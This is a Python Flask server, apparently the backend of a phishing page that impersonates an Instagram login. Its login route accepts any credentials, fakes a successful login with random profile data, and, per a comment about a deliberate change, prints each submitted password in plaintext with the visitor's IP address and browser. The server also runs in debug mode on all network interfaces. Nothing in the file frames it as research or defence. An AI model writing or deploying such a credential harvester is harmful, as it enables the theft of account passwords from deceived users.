from flask import Flask, request, jsonify
from datetime import datetime
import random
import string

app = Flask(__name__)

# ===================================================
#   Terminal me colorful logs ke liye
# ===================================================
def log(msg, color="\033[0m"):
    timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    print(f"  {color}[{timestamp}]{msg}\033[0m")

def log_info(msg):
    log(msg, "\033[96m")    # Cyan

def log_success(msg):
    log(msg, "\033[92m")    # Green

def log_error(msg):
    log(msg, "\033[91m")    # Red

def log_warn(msg):
    log(msg, "\033[93m")    # Yellow

def log_data(msg):
    log(msg, "\033[95m")    # Magenta

def log_sep():
    print("\n  " + "━" * 55 + "\n")


# ===================================================
#   LOGIN API
# ===================================================
@app.route('/api/login', methods=['POST'])
def login():
    log_sep()
    log_info("  📡 LOGIN API CALLED")
    log_sep()

    try:
        data = request.get_json()
        username = data.get('username', '').strip()
        password = data.get('password', '').strip()

        # --- Log incoming data ---
        log_data(f"  Username  : \"{username}\"")
        # >>> YAHAN CHANGE KIYA — ab saaf password dikhega <<<
        log_data(f"  Password  : \"{password}\" ({len(password)} chars)")
        log_info(f"  IP        : {request.remote_addr}")
        log_info(f"  Browser   : {request.headers.get('User-Agent', 'Unknown')[:60]}...")
        log_info(f"  Time      : {datetime.now().isoformat()}")

        # --- Validation ---
        print()
        if not username:
            log_error("  ❌ FAIL: Username empty")
            return jsonify({
                "success": False,
                "error": "Please enter your username or email"
            }), 400

        if not password:
            log_error("  ❌ FAIL: Password empty")
            return jsonify({
                "success": False,
                "error": "Please enter your password"
            }), 400

        if len(password) < 6:
            log_error(f"  ❌ FAIL: Password too short ({len(password)} chars)")
            return jsonify({
                "success": False,
                "error": "Password must be at least 6 characters"
            }), 400

        # --- Detect login type ---
        if '@' in username:
            login_type = 'email'
        elif username.isdigit():
            login_type = 'phone'
        else:
            login_type = 'username'
        
        log_info(f"  🔍 Login type: {login_type}")

        # --- Simulate DB check (demo: always succeeds) ---
        print()
        log_info("  ⏳ Checking database...")
        
        # Simulate delay like real server
        import time
        time.sleep(1)

        # Generate fake token
        token_chars = string.ascii_letters + string.digits
        token = "eyJhbGciOiJIUzI1NiJ9." + ''.join(random.choices(token_chars, k=30)) + "." + ''.join(random.choices(token_chars, k=20))

        # Fake user data from DB
        user_data = {
            "id": random.randint(10000, 99999),
            "username": username,
            "full_name": "Demo User",
            "profile_pic": f"https://picsum.photos/seed/{username}/150/150.jpg",
            "followers": random.randint(100, 50000),
            "following": random.randint(50, 2000),
            "bio": "🚀 Building something amazing",
            "is_verified": random.choice([True, False]),
            "account_created": "2023-06-15"
        }

        print()
        log_success("  ✅ DATABASE: User found!")
        log_data(f"     ID         : {user_data['id']}")
        log_data(f"     Full Name  : {user_data['full_name']}")
        log_data(f"     Followers  : {user_data['followers']:,}")
        log_data(f"     Following  : {user_data['following']:,}")
        log_data(f"     Verified   : {user_data['is_verified']}")
        log_data(f"     Token      : {token[:30]}...")

        print()
        log_success("  ✅ LOGIN SUCCESSFUL")
        log_sep()

        return jsonify({
            "success": True,
            "message": "Login successful",
            "user": user_data,
            "token": token,
            "login_type": login_type,
            "server_time": datetime.now().isoformat()
        }), 200

    except Exception as e:
        log_error(f"  💥 SERVER ERROR: {str(e)}")
        log_sep()
        return jsonify({
            "success": False,
            "error": "Internal server error"
        }), 500


# ===================================================
#   FORGOT PASSWORD API
# ===================================================
@app.route('/api/forgot-password', methods=['POST'])
def forgot_password():
    log_sep()
    log_warn("  📧 FORGOT PASSWORD API CALLED")
    log_sep()

    data = request.get_json()
    username = data.get('username', '').strip()

    log_data(f"  Requested for: \"{username}\"")

    if not username:
        log_error("  ❌ No username provided")
        return jsonify({"success": False, "error": "Enter username first"}), 400

    email = username if '@' in username else f"{username}@email.com"
    log_success(f"  ✅ Reset email sent to: {email}")
    log_sep()

    return jsonify({
        "success": True,
        "message": f"Reset link sent to {email}"
    }), 200


# ===================================================
#   LOGOUT API
# ===================================================
@app.route('/api/logout', methods=['POST'])
def logout():
    log_sep()
    log_warn("  👋 LOGOUT API CALLED")
    log_info(f"  IP: {request.remote_addr}")
    log_success("  ✅ Session destroyed")
    log_sep()

    return jsonify({
        "success": True,
        "message": "Logged out successfully"
    }), 200


# ===================================================
#   SERVE HTML
# ===================================================
@app.route('/')
def index():
    return open('index.html', 'r').read()


# ===================================================
#   START SERVER
# ===================================================
if __name__ == '__main__':
    print()
    print("  " + "━" * 55)
    print("  \033[96m   🚀 Instagram Login Server Running\033[0m")
    print("  \033[92m   ➜  http://localhost:8080\033[0m")
    print("  \033[93m   Terminal me live logs dikhege\033[0m")
    print("  " + "━" * 55)
    print()

    app.run(host='0.0.0.0', port=8080, debug=True)
